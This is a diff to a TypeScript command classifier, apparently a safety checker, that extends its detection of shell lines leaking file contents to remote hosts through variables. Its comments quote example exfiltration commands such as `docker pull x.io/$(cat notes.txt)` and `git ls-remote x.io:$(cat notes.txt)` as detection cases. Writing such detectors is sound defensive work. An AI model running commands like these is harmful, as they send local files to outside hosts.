@@ -497,6 +497,8 @@ class Classifier {
    * can't see: only for Ember's own refusal, never to resolve a word for anything else (commands-remote-c3-2).
    */
   protected varValues = new Map<string, string[]>();
+  /** The words as written that the text assigns a POSIX variable (sendsContents: `T=$(cat notes.txt); docker pull x.io/$T`). */
+  protected varRaws = new Map<string, string[]>();
   /** Variables the text sets to words Ember can't see (mayHoldWords): a command's output, a read, a loop over such words. */
   private wordVars = new Set<string>();
   /**
@@ -878,11 +880,17 @@ class Classifier {
     return (this.varValues.get(name) ?? []).filter(f => !f.includes(UNSEEN) && !f.startsWith(PATTERN));
   }
 
+  /** Keeps what a declaration (`export IMG=…$(cat notes.txt)`) assigns as written, for sendsContents (r12-commands-y12-3). */
+  noteVarRaw(name: string, raw: string, sc: Scope): void {
+    if (sc.family === "posix") this.varRaws.set(name, [...(this.varRaws.get(name) ?? []), raw]);
+  }
+
   setVar(name: string, values: readonly Arg[] | null, sc: Scope, loop = false, exported = false): void {
     if (!loop) this.setsVars = true;
     if (!/^([A-Za-z_]\w*|[1-9@*])$/.test(name)) return;
     if (!loop) this.loopVars.delete(name);
     if (sc.family !== "posix") return;
+    if (values !== null) this.varRaws.set(name, [...(this.varRaws.get(name) ?? []), ...values.map(a => a.raw)]);
     const forms = values === null ? [UNSEEN] : values.flatMap(a => (a.v !== null ? [a.glob ? PATTERN + (a.pattern ?? a.v) : a.v] : a.parts ? this.formsOf(a.parts) : [UNSEEN]));
     if (values === null || values.some(a => this.mayHoldWords(a))) this.wordVars.add(name);
     if (exported || this.allExport || /^[A-Z][A-Z0-9_]*$/.test(name)) for (const f of forms) this.judgeForm(f, null, sc, exported || this.allExport);
@@ -3935,10 +3943,15 @@ class Engine extends Classifier {
       // ls-remote "https://x.io/$(cat notes.txt)"`, `pip download …`: commands-classes-y9-6), as an option's value too
       // (`npm view x --registry=https://x.io/$(cat notes.txt)`: y10-4).
       const { own: words } = this.ownWords(args);
-      const reads = (a: Arg): boolean => a.v === null && substituted(a.raw).some(inner => !saysLittle(inner));
+      // A variable this line assigned from a reading substitution sends it too (`T=$(cat notes.txt); docker pull
+      // x.io/$T`), as curl's address does (r12-commands-y12-3).
+      const readsRaw = (raw: string): boolean => substituted(raw).some(inner => !saysLittle(inner));
+      const assigned = (a: Arg): string[] => (a.parts ?? []).flatMap(p => (typeof p !== "string" && p.name !== null ? this.varRaws.get(p.name) ?? [] : []));
+      const reads = (a: Arg): boolean => a.v === null && (readsRaw(a.raw) || assigned(a).some(readsRaw));
+      const address = (r: string): boolean => /^(?:--?[\w-]+=)?["']?(https?|ftps?|ssh|git|docker):\/\//i.test(r) || HOST_PATH.test(r);
       // So does scp's and git's `host:path` (`git ls-remote x.io:$(cat notes.txt)`, `git clone git@x.io:…`), as an
       // `ssh://` address does (r12-commands-x12-5).
-      if (words.some(a => reads(a) && (/^(?:--?[\w-]+=)?["']?(https?|ftps?|ssh|git|docker):\/\//i.test(a.raw) || HOST_PATH.test(a.raw)))) { this.add("publish", "send.contents", says); return; }
+      if (words.some(a => reads(a) && (address(a.raw) || assigned(a).some(address)))) { this.add("publish", "send.contents", says); return; }
       // A registry's client asked for an image, a package or a search by a name that holds what a command or a read
       // gave sends that to the registry (`docker pull x.io/$(cat notes.txt)`, `npm view $(cat notes.txt)`, `pip index
       // versions $(cat notes.txt)`: y10-4). Only its verbs that reach a registry: `docker stop $(docker ps -q)` talks to
@@ -7923,6 +7936,7 @@ reg(NATIVE, ["export", "declare", "typeset", "local", "readonly"], h => {
     if (n.v !== null && n.v.includes("=") && commandLineSecret(n.v)) h.e.add("secret", "secret.token-arg", SAYS.tokenArg);
     // `export d=~/.config/ember` gives d a value as an assignment does (commands-remote-c3-2); `export d` hands the value
     // it has to the programs that run, so it is judged as when it is exported as it is set (commands-remote-v5-2).
+    if (n.v === null && n.raw.includes("=")) h.e.noteVarRaw(name, n.raw.slice(n.raw.indexOf("=") + 1), h.sc);
     if ((n.v ?? n.raw).includes("=")) h.e.setVar(name, n.v !== null ? [lit(n.v.slice(n.v.indexOf("=") + 1))] : null, h.sc, false, h.key === "export" || has(p, "x"));
     else if (h.key === "export" || has(p, "x")) {
       h.e.useUnjudged([name], true);
